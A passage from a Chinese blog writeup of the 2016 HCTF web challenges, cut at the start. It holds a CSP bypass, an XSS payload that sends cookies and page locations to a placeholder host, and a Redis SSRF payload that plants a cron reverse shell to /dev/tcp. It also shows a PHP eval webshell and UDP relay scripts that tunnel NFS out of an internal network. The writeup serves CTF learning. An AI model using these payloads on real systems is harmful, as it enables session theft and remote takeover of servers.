<pre><code>Content-Security-Policy:default-src 'self'; script-src http://sguestbook.hctf.io/static/ 'sha256-n+kMAVS5Xj7r/dvV9ZxAbEX6uEmK+uen+HZXbLhVsVA=' 'sha256-2zDCsAh4JN1o1lpARla6ieQ5KBrjrGpn0OAjeJ1V9kg=' 'sha256-SQQX1KpZM+ueZs+PyglurgqnV7jC8sJkUMsG9KkaFwQ=' 'sha256-JXk13NkH4FW9/ArNuoVR9yRcBH7qGllqf1g5RnJKUVg=' 'sha256-NL8WDWAX7GSifPUosXlt/TUI6H8JU0JlK7ACpDzRVUc=' 'sha256-CCZL85Vslsr/bWQYD45FX+dc7bTfBxfNmJtlmZYFxH4=' 'sha256-2Y8kG4IxBmLRnD13Ne2JV/V106nMhUqzbbVcOdxUH8I=' 'sha256-euY7jS9jMj42KXiApLBMYPZwZ6o97F7vcN8HjBFLOTQ=' 'sha256-V6Bq3u346wy1l0rOIp59A6RSX5gmAiSK40bp5JNrbnw='; font-src http://sguestbook.hctf.io/static/ fonts.gstatic.com; style-src 'self' 'unsafe-inline'; img-src 'self'</code></pre>
<p>值的注意的点是：<a class="uri" href="http://sguestbook.hctf.io/static/">http://sguestbook.hctf.io/static/</a></p>
<p>必须要在这个目录下面加载。</p>
<p>解法一：</p>
<p>这个目录有一个redirect.php，利用跳转去加载。</p>
<div class="sourceCode"><pre class="sourceCode js"><code class="sourceCode javascript"><span class="op">&lt;</span>scscriptript src<span class="op">=</span>http<span class="op">:</span><span class="co">//sguestbook.hctf.io/static/redirect.php?u=http://sguestbook.hctf.io/upload/a32642750cae25f4c5b020d9a66c5c5c&gt;&lt;/scscriptript&gt;</span></code></pre></div>
<p>解法二：</p>
<div class="sourceCode"><pre class="sourceCode js"><code class="sourceCode javascript"><span class="op">&lt;</span>scscriptript src<span class="op">=</span><span class="st">"http://sguestbook.hctf.io/static/..%2fupload/a32642750cae25f4c5b020d9a66c5c5c"</span><span class="op">&gt;&lt;</span><span class="ss">/scscriptript&gt;</span></code></pre></div>
<p>其中upload的这个文件，是可以通过头像上传的。内容是：</p>
<div class="sourceCode"><pre class="sourceCode js"><code class="sourceCode javascript"><span class="kw">var</span> n0t <span class="op">=</span> <span class="va">document</span>.<span class="at">createElement</span>(<span class="st">"link"</span>)<span class="op">;</span><span class="va">n0t</span>.<span class="at">setAttribute</span>(<span class="st">"rel"</span><span class="op">,</span> <span class="st">"preload"</span>)<span class="op">;</span><span class="va">n0t</span>.<span class="at">setAttribute</span>(<span class="st">"href"</span><span class="op">,</span> <span class="st">"//ipipipip/"</span><span class="op">+</span><span class="at">escape</span>((<span class="kw">function</span>()<span class="op">{</span><span class="cf">try</span><span class="op">{</span><span class="cf">return</span> <span class="va">document</span>.<span class="va">location</span>.<span class="at">href</span><span class="op">}</span><span class="cf">catch</span>(e)<span class="op">{</span><span class="cf">return</span> <span class="st">''</span><span class="op">}}</span>)())<span class="op">+</span><span class="st">'&amp;toplocation='</span><span class="op">+</span><span class="at">escape</span>((<span class="kw">function</span>()<span class="op">{</span><span class="cf">try</span><span class="op">{</span><span class="cf">return</span> <span class="va">top</span>.<span class="va">location</span>.<span class="at">href</span><span class="op">}</span><span class="cf">catch</span>(e)<span class="op">{</span><span class="cf">return</span> <span class="st">''</span><span class="op">}}</span>)())<span class="op">+</span><span class="st">'&amp;cookie='</span><span class="op">+</span><span class="at">escape</span>((<span class="kw">function</span>()<span class="op">{</span><span class="cf">try</span><span class="op">{</span><span class="cf">return</span> <span class="va">document</span>.<span class="at">cookie</span><span class="op">}</span><span class="cf">catch</span>(e)<span class="op">{</span><span class="cf">return</span> <span class="st">''</span><span class="op">}}</span>)())<span class="op">+</span><span class="st">'&amp;opener='</span><span class="op">+</span><span class="at">escape</span>((<span class="kw">function</span>()<span class="op">{</span><span class="cf">try</span><span class="op">{</span><span class="cf">return</span> (<span class="va">window</span>.<span class="at">opener</span> <span class="op">&amp;&amp;</span> <span class="va">window</span>.<span class="va">opener</span>.<span class="va">location</span>.<span class="at">href</span>)<span class="op">?</span><span class="va">window</span>.<span class="va">opener</span>.<span class="va">location</span>.<span class="at">href</span>:<span class="st">''</span><span class="op">}</span><span class="cf">catch</span>(e)<span class="op">{</span><span class="cf">return</span> <span class="st">''</span><span class="op">}}</span>)()))<span class="op">;</span><span class="va">document</span>.<span class="va">head</span>.<span class="at">appendChild</span>(n0t)<span class="op">;</span></code></pre></div>
<h3 id="at-field1">AT field1</h3>
<p>只要跳到127.0.0.1就可以了。改下解析ip，或者直接一个302跳转都行。</p>
<h3 id="at-field2">AT field2</h3>
<p>内网里面存在一个redis。利用前面的urllib的host可以导致ssrf，进而攻击redis可以反弹一个shell。</p>
<p><a class="uri" href="https://security.tencent.com/index.php/blog/msg/106">https://security.tencent.com/index.php/blog/msg/106</a></p>
<pre><code>http://192.168.0.10%25250d%25250a%252a3%25250d%25250a%2525243%25250d%25250aset%25250d%25250a%2525241%25250d%25250a1%25250d%25250a%25252462%25250d%25250a%25250a%252a%25252F1%252520%252a%252520%252a%252520%252a%252520%252a%252520%25252Fbin%25252Fbash%252520-i%252520%25253E%252526%252520%25252Fdev%25252Ftcp%25252Fipipip%25252F2333%2525200%25253E%2525261%25250a%25250d%25250aconfig%252520set%252520dir%252520%25252Fvar%25252Fspool%25252Fcron%25252F%25250d%25250aconfig%252520set%252520dbfilename%252520root%25250d%25250asave%25250d%25250a%253A6379%252f</code></pre>
<h3 id="你没走过的套路">你没走过的套路</h3>
<pre><code>http://120.27.122.0/index.php~
&lt;?php
echo "welcome to aklis's bowl";
@eval($_GET['aklis']);</code></pre>
<p>发现192.168.0.1开放了111、2049端口</p>
<p>因为nfs在挂载的时候会有一些udp包，代理等一些手段是不行的。</p>
<p>自己的服务器：</p>
<div class="sourceCode"><pre class="sourceCode python"><code class="sourceCode python"><span class="im">import</span> socket
<span class="im">import</span> sys
<span class="im">import</span> struct

sock_src <span class="op">=</span> socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock_dst <span class="op">=</span> socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
recv_addr <span class="op">=</span> (<span class="st">'0.0.0.0'</span>, <span class="dv">111</span>)
dst_addr <span class="op">=</span> (<span class="st">'0.0.0.0'</span>, <span class="dv">11111</span>)
sock_src.bind(recv_addr)
sock_dst.bind(dst_addr)

<span class="cf">while</span> <span class="va">True</span>:
    <span class="bu">print</span>(<span class="st">'waitting for OK from client'</span>)
    _, addr_dst <span class="op">=</span> sock_dst.recvfrom(<span class="dv">65565</span>)
    <span class="cf">if</span> _ <span class="op">==</span> <span class="st">'OK'</span>:
        <span class="bu">print</span>(<span class="st">'OK recieved from </span><span class="sc">{0}</span><span class="st">'</span>.<span class="bu">format</span>(addr_dst))
    data, addr_src <span class="op">=</span> sock_src.recvfrom(<span class="dv">65565</span>)
    <span class="bu">print</span>(<span class="st">'send: </span><span class="sc">{0!r}</span><span class="st"> to </span><span class="sc">{1}</span><span class="st">'</span>.<span class="bu">format</span>(data, addr_dst))
    sock_dst.sendto(data, addr_dst)

    data, _  <span class="op">=</span> sock_dst.recvfrom(<span class="dv">65565</span>)
    <span class="bu">print</span>(<span class="st">'received: </span><span class="sc">{0!r}</span><span class="st"> from </span><span class="sc">{1}</span><span class="st">'</span>.<span class="bu">format</span>(data, _))
    port <span class="op">=</span> struct.unpack(<span class="st">'!i'</span>, data[<span class="op">-</span><span class="dv">4</span>:])[<span class="dv">0</span>]
    sock_src.sendto(data, addr_src)

    <span class="bu">print</span>(<span class="st">'PORT: </span><span class="sc">{0}</span><span class="st">'</span>.<span class="bu">format</span>(port))

sock_src.close()
sock_dst.close()</code></pre></div>
<p>要拿的目标服务器</p>
<div class="sourceCode"><pre class="sourceCode python"><code class="sourceCode python"><span class="im">import</span> socket
<span class="im">import</span> sys
<span class="im">import</span> struct

sock_src <span class="op">=</span> socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock_dst <span class="op">=</span> socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
recv_addr <span class="op">=</span> (<span class="st">'vps-ip'</span>, <span class="dv">11111</span>)
dst_addr <span class="op">=</span> (<span class="st">'192.168.0.1'</span>, <span class="dv">111</span>)

<span class="cf">while</span> <span class="va">True</span>:
    <span class="cf">try</span>:
        <span class="bu">print</span>(<span class="st">'send OK to </span><span class="sc">{0}</span><span class="st">'</span>.<span class="bu">format</span>(recv_addr))
        sock_src.sendto(<span class="st">'OK'</span>, recv_addr)
        data, addr_src  <span class="op">=</span> sock_src.recvfrom(<span class="dv">65565</span>)
        <span class="bu">print</span>(<span class="st">'send: </span><span class="sc">{0!r}</span><span class="st"> to </span><span class="sc">{1}</span><span class="st">'</span>.<span class="bu">format</span>(data, dst_addr))
        sock_dst.sendto(data, dst_addr)
        data, _ <span class="op">=</span> sock_dst.recvfrom(<span class="dv">65565</span>)
        <span class="bu">print</span>(<span class="st">'received: </span><span class="sc">{0!r}</span><span class="st"> from </span><span class="sc">{1}</span><span class="st">'</span>.<span class="bu">format</span>(data, dst_addr))
        sock_src.sendto(data, addr_src)
    <span class="cf">except</span> <span class="pp">KeyboardInterrupt</span>:
        sock_src.sendto(<span class="st">'CLOSE'</span>, addr_src)
        <span class="cf">break</span>

sock_src.close()
sock_dst.close()</code></pre></div>
<p>再把根据文章把3个端口转出来，111、892、2049<br/>
ps：此题我转发了54280、40878、111、892、2049</p>
<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="kw">ssh</span> vps_ip -lroot -R111:120.27.122.0:111 -CNfg</code></pre></div>
<p>＝。＝，值的注意的是，因为公网ip(120.27.122.0)是屏蔽了端口的，所以还是需要用python在shell上面去转发一下到vps，也就是192.168.0.1的2049转到vps-ip的2049，上面只是将120.27.122.0的111转发到本地的111</p>
<pre><code>showmount -e 127.0.0.1
mount -t nfs -o nolock 127.0.0.1:/var/nfs /tmp/a</code></pre>
<p><img src="./2016 HCTF web writeup - l3m0n - 博客园/804631-20161128220212224-971479604.png"/></p>
<p>＝。＝，火日聚聚。</p>
<div class="sourceCode"><pre class="sourceCode php"><code class="sourceCode php">    location ~ \.php$ {
        <span class="co">#proxy_pass   http://127.0.0.1;</span>
        fastcgi_index index.php<span class="ot">;</span>
        <span class="kw">include</span> fastcgi_params<span class="ot">;</span>
    }

    location /<span class="kw">static</span> {
        alias /<span class="er">var</span>/www/<span class="kw">static</span>/<span class="ot">;</span>
        autoindex on<span class="ot">;</span>
    }</code></pre></div>
<p>然后nginx是/static是/var/www/static/的别名，如果你访问了/static../<br/>
结果就是访问了/var/www/static/../，也就是static的上一级目录。</p>
<p><img src="./2016 HCTF web writeup - l3m0n - 博客园/804631-20161128220221177-856500739.png"/></p>
</div><div id="MySignature"></div>
<div class="clear"></div>
<div id="blog_post_info_block">
<div id="BlogPostCategory"></div>
<div id="EntryTag"></div>
<div id="blog_post_info">
</div>
<div class="clear"></div>
<div id="post_next_prev"></div>
</div>
</div>
<div class="postDesc">posted @ <span id="post-date">2016-11-28 22:03</span> <a href="http://www.cnblogs.com/iamstudy/">l3m0n</a> 阅读(<span id="post_view_count">...</span>) 评论(<span id="post_comment_count">...</span>)  <a href="https://i.cnblogs.com/EditArticles.aspx?postid=6111588" rel="nofollow">编辑</a> <a href="#" onclick="AddToWz(6111588);return false;">收藏</a></div>
</div>
<script src="./2016 HCTF web writeup - l3m0n - 博客园/highlight.min.jsid=20160127"></script><script>markdown_highlight();</script><script type="text/javascript">var allowComments=true,cb_blogId=242399,cb_entryId=6111588,cb_blogApp=currentBlogApp,cb_blogUserGuid='f80873d6-234e-e511-b908-9dcfd8948a71',cb_entryCreatedDate='2016/11/28 22:03:00';loadViewCount(cb_entryId);</script>
</div><!--end: topics 文章、评论容器-->
</div><a name="!comments"></a><div id="blog-comments-placeholder"></div><script type="text/javascript">var commentManager = new blogCommentManager();commentManager.renderComments(0);</script>
<div class="commentform" id="comment_form">
<a name="commentform"></a>
<div id="divCommentShow"></div>
<div id="comment_nav"><span id="span_refresh_tips"></span><a clientidmode="Static" href="javascript:void(0);" id="lnk_RefreshComments" onclick="return RefreshCommentList();" runat="server">刷新评论</a><a href="#" onclick="return RefreshPage();">刷新页面</a><a href="#top">返回顶部</a></div>
<div id="comment_form_container"></div>
<div class="ad_text_commentbox" id="ad_text_under_commentbox"></div>
<div id="ad_t2"></div>
<div id="opt_under_post"></div>
<div class="c_ad_block" id="cnblogs_c1"></div>
<div id="under_post_news"></div>
<div class="c_ad_block" id="cnblogs_c2"></div>
<div id="under_post_kb"></div>
<div class="c_ad_block" id="HistoryToday"></div>
<script type="text/javascript">
    fixPostBody();
    setTimeout(function () { incrementViewCount(cb_entryId); }, 50);
    deliverAdT2();
    deliverAdC1();
    deliverAdC2();    
    loadNewsAndKb();
    loadBlogSignature();
    LoadPostInfoBlock(cb_blogId, cb_entryId, cb_blogApp, cb_blogUserGuid);
    GetPrevNextPost(cb_entryId, cb_blogId, cb_entryCreatedDate);
    loadOptUnderPost();
    GetHistoryToday(cb_blogId, cb_blogApp, cb_entryCreatedDate);   
</script>
</div>
</div><!--end: forFlow -->
</div><!--end: mainContent 主体内容容器-->
<div id="sideBar">
<div id="sideBarMain">
<!--done-->
<div class="newsItem">
<h3 class="catListTitle">公告</h3>
<div id="blog-news"></div><script type="text/javascript">loadBlogNews();</script>
</div>
<div id="calendar"><div id="blog-calendar" style="display:none"></div><script type="text/javascript">loadBlogDefaultCalendar();</script></div>
<div id="leftcontentcontainer">
<div id="blog-sidecolumn"></div><script type="text/javascript">loadBlogSideColumn();</script>
</div>
</div><!--end: sideBarMain -->
</div><!--end: sideBar 侧边栏容器 -->
<div class="clear"></div>
<div class="clear"></div>
</div><!--end: main -->
<div class="clear"></div>
<div id="footer">
<!--done-->
Copyright ©2017 l3m0n 谨以此模板祝贺【博客园开发者征途】系列图书之《你必须知道的.NET》出版发行
	</div><!--end: footer -->
</div><!--end: home 自定义的最大容器 -->
<!--PageEndHtml Block Begin-->
<div align="center" id="something">
<script language="javascript" src="./2016 HCTF web writeup - l3m0n - 博客园/18599866.js" type="text/javascript"></script>
<noscript><a href="//www.51.la/?18599866" target="_blank"><img alt="我要啦免费统计" src="./2016 HCTF web writeup - l3m0n - 博客园/18599866.asp" style="border:none"/></a></noscript>
<script language="javascript" src="./2016 HCTF web writeup - l3m0n - 博客园/id=18599866&amp;mb=3" type="text/javascript"></script>
</div>
<script>
$('#footer').html('Copyright &copy;2017 Syclover-l3m0n');
console.log('Hello,welcome to my blog!!!\n                  --------l3m0n');
window.onload=function(){
  $('#q').css({'width':'100px'});
  $('#under_post_news').html('');
  $('#under_post_kb').html('');
  $('#ad_t2').html('');
  $('#cnblogs_c1').html('');
  $('#cnblogs_c2').html('');
}
</script>
<!--PageEndHtml Block End-->
</body>
</html>
